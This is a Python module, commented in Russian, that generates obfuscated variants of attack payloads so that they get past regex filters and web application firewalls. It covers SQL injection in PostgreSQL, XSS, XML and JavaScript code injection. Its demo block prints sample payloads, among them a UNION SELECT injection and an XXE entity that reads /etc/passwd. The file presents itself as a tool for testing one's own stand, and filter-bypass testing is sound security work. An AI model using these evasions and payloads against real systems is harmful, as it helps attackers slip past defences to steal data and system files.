#!/usr/bin/env python3
"""
encoders.py — слой кодирования/обфускации payload'ов для обхода регулярок и WAF.

Идея: держать в словарях «чистые» payload'ы, а варианты для обхода фильтров
генерировать на лету. Так один payload разворачивается в десятки представлений,
и словари не раздуваются.

Два уровня:
  1. ОБЩИЕ кодировки (работают на транспортном уровне HTTP) — применимы к любой
     категории: URL / double-URL / смешанный регистр / вставка невидимых
     символов и т.п. Сервер их декодирует ДО того, как увидит полезную нагрузку.
  2. КОНТЕКСТНЫЕ мутаторы под конкретный движок:
       sqli  — комментарии вместо пробелов, CHR()/конкатенация, регистр ключевых слов (PostgreSQL)
       xss   — HTML-сущности, JS-эскейпы, кодировка событий
       xml   — числовые XML-сущности, CDATA, кодирование в объявлении
       code  — конкатенация строк, \\xNN эскейпы, unicode

Применение маркера: WSMARK в payload'е не трогается кодировщиком (он уже
заменён на уникальный токен к моменту мутации) — поэтому мутируем ПОСЛЕ
подстановки маркера... но детект XSS ищет голый токен, а кодирование токена
его спрячет. Поэтому для xss-мутаторов, которые ломают сам токен, используется
отдельная политика: см. mutate() и параметр keep_marker.

ВАЖНО: это инструмент тестирования обхода фильтров на СВОЁМ стенде. Деструктива
мутаторы не добавляют — они лишь меняют представление уже имеющихся проб.
"""
import random
import re
import urllib.parse


# ---------------------------------------------------------------------------
# 1. ОБЩИЕ транспортные кодировки
# ---------------------------------------------------------------------------
def url_encode(s: str) -> str:
    """Полное процентное кодирование всех символов."""
    return "".join("%{:02X}".format(b) for b in s.encode("utf-8"))


def url_encode_special(s: str) -> str:
    """Кодируются только «подозрительные» символы — тише для логов, но ломает регэксп."""
    return urllib.parse.quote(s, safe="")


def double_url_encode(s: str) -> str:
    """Двойное URL-кодирование: обходит фильтры, которые декодируют один раз."""
    return url_encode(url_encode_special(s))


def mixed_case(s: str) -> str:
    """Случайный регистр букв (обход регистрозависимых сигнатур)."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def unicode_overlong_dots(s: str) -> str:
    """
    Заменяет пробелы на эквиваленты, которые многие парсеры трактуют как
    разделитель, а наивные регэкспы \\s — нет.
    """
    return s.replace(" ", " ")   # NBSP


def insert_null_comments(s: str) -> str:
    """Вставка NUL-подобных маркеров там, где движок их игнорирует (в URL)."""
    return s.replace(" ", "%00 ")


GENERIC = {
    "url": url_encode_special,
    "url_full": url_encode,
    "double_url": double_url_encode,
    "mixed_case": mixed_case,
    "nbsp": unicode_overlong_dots,
}


# ---------------------------------------------------------------------------
# 2. КОНТЕКСТНЫЕ мутаторы
# ---------------------------------------------------------------------------

# --- SQL (PostgreSQL) ------------------------------------------------------
_SQL_KEYWORDS = ("SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER",
                 "GROUP", "SLEEP", "PG_SLEEP", "CAST", "CHR", "VERSION",
                 "DELAY", "WAITFOR")


def sql_comment_spaces(s: str) -> str:
    """Пробелы -> инлайн-комментарии /**/ (классический обход 'нет пробелов')."""
    return re.sub(r"\s+", "/**/", s)


def sql_mixed_keyword_case(s: str) -> str:
    """SeLeCt вместо SELECT — обход регистрозависимых чёрных списков."""
    out = s
    for kw in _SQL_KEYWORDS:
        out = re.sub(kw, lambda m: mixed_case(m.group(0)), out, flags=re.IGNORECASE)
    return out


def sql_inline_comment_keywords(s: str) -> str:
    """Разрыв ключевых слов комментарием: SEL/**/ECT, не ломает исполнение в PG."""
    out = s
    for kw in _SQL_KEYWORDS:
        if len(kw) > 3:
            broken = kw[:len(kw) // 2] + "/**/" + kw[len(kw) // 2:]
            out = re.sub(kw, broken, out, flags=re.IGNORECASE)
    return out


def sql_chr_encode_strings(s: str) -> str:
    """
    Строковые литералы 'abc' -> CHR(97)||CHR(98)||CHR(99) (PostgreSQL).
    Обходит фильтры, ищущие кавычки и буквальные строки.
    """
    def repl(m):
        body = m.group(1)
        if not body:
            return m.group(0)
        return "(" + "||".join(f"CHR({ord(c)})" for c in body) + ")"
    return re.sub(r"'([^']*)'", repl, s)


SQL_MUT = {
    "sql_comment_spaces": sql_comment_spaces,
    "sql_case": sql_mixed_keyword_case,
    "sql_break_kw": sql_inline_comment_keywords,
    "sql_chr": sql_chr_encode_strings,
}


# --- XSS -------------------------------------------------------------------
def xss_html_entities(s: str) -> str:
    """Все символы -> десятичные HTML-сущности (&#NN;). Обход тегов-фильтров."""
    return "".join(f"&#{ord(c)};" for c in s)


def xss_html_entities_hex(s: str) -> str:
    """Шестнадцатеричные HTML-сущности (&#xNN;)."""
    return "".join(f"&#x{ord(c):x};" for c in s)


def xss_js_unicode(s: str) -> str:
    """JS \\uXXXX эскейпы — для контекста внутри <script>."""
    return "".join(f"\\u{ord(c):04x}" for c in s)


def xss_tag_case_and_slash(s: str) -> str:
    """Разбавление тегов: <ScRiPt>, лишние слэши/переводы строк в атрибутах."""
    s = re.sub(r"<(/?)(\w+)", lambda m: "<" + m.group(1) + mixed_case(m.group(2)), s)
    s = s.replace("src=", "src/**/=").replace("onerror=", "oNeRror\x09=")
    return s


XSS_MUT = {
    "xss_entities": xss_html_entities,
    "xss_entities_hex": xss_html_entities_hex,
    "xss_js_unicode": xss_js_unicode,
    "xss_tag_case": xss_tag_case_and_slash,
}


# --- XML -------------------------------------------------------------------
def xml_numeric_entities(s: str) -> str:
    """Кодирование значащих символов в числовые XML-сущности."""
    specials = "<>&\"'"
    return "".join(f"&#{ord(c)};" if c in specials else c for c in s)


def xml_cdata_wrap(s: str) -> str:
    """Обернуть полезную нагрузку в CDATA (обход фильтров тегов в значениях)."""
    return f"<![CDATA[{s}]]>"


def xml_utf16_decl(s: str) -> str:
    """
    Сменить объявление кодировки — некоторые WAF парсят XML только как UTF-8
    и пропускают UTF-16-объявленный документ, а парсер приложения — читает.
    """
    if s.lstrip().startswith("<?xml"):
        return re.sub(r'encoding="[^"]*"', 'encoding="UTF-16"', s, count=1)
    return '<?xml version="1.0" encoding="UTF-16"?>' + s


XML_MUT = {
    "xml_entities": xml_numeric_entities,
    "xml_cdata": xml_cdata_wrap,
    "xml_utf16": xml_utf16_decl,
}


# --- Code (SSJS / выражения) ----------------------------------------------
def code_string_concat(s: str) -> str:
    """'alert' -> 'al'+'ert' — разрыв ключевых слов для обхода сигнатур."""
    def repl(m):
        body = m.group(1)
        if len(body) < 2:
            return m.group(0)
        mid = len(body) // 2
        return f"'{body[:mid]}'+'{body[mid:]}'"
    return re.sub(r"'([A-Za-z]{3,})'", repl, s)


def code_hex_escape(s: str) -> str:
    """JS \\xNN эскейпы для букв/символов."""
    return "".join(f"\\x{ord(c):02x}" if c.isalnum() else c for c in s)


def code_unicode_escape(s: str) -> str:
    """JS \\uXXXX эскейпы."""
    return "".join(f"\\u{ord(c):04x}" if c.isalnum() else c for c in s)


CODE_MUT = {
    "code_concat": code_string_concat,
    "code_hex": code_hex_escape,
    "code_unicode": code_unicode_escape,
}


CONTEXT_MUT = {
    "sqli": SQL_MUT,
    "xss": XSS_MUT,
    "xml": XML_MUT,
    "code": CODE_MUT,
}


# ---------------------------------------------------------------------------
# Публичный интерфейс
# ---------------------------------------------------------------------------
def available(category: str):
    """Имена всех мутаторов, применимых к категории (контекстные + общие)."""
    names = list(CONTEXT_MUT.get(category, {}).keys()) + list(GENERIC.keys())
    return names


def mutate(payload: str, category: str, selected=None):
    """
    Возвращает список (имя_мутатора, обфусцированный_payload).
    Исходный payload всегда идёт первым под именем 'raw'.

    selected — список имён мутаторов; None = все для категории.
    Мутаторы, бросающие исключение на конкретной строке, тихо пропускаются.
    """
    variants = [("raw", payload)]
    pool = {}
    pool.update(CONTEXT_MUT.get(category, {}))
    pool.update(GENERIC)
    names = selected if selected else list(pool.keys())
    seen = {payload}
    for name in names:
        fn = pool.get(name)
        if not fn:
            continue
        try:
            out = fn(payload)
        except Exception:
            continue
        if out and out not in seen:
            seen.add(out)
            variants.append((name, out))
    return variants


if __name__ == "__main__":
    # Демонстрация: показать варианты для по одному примеру на категорию.
    samples = {
        "sqli": "1' UNION SELECT version()--",
        "xss": "<script>alert(1)</script>",
        "xml": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        "code": "'+alert('x')+'",
    }
    for cat, s in samples.items():
        print(f"\n=== {cat} ===  (исходник: {s})")
        for name, v in mutate(s, cat):
            print(f"  {name:20} {v}")
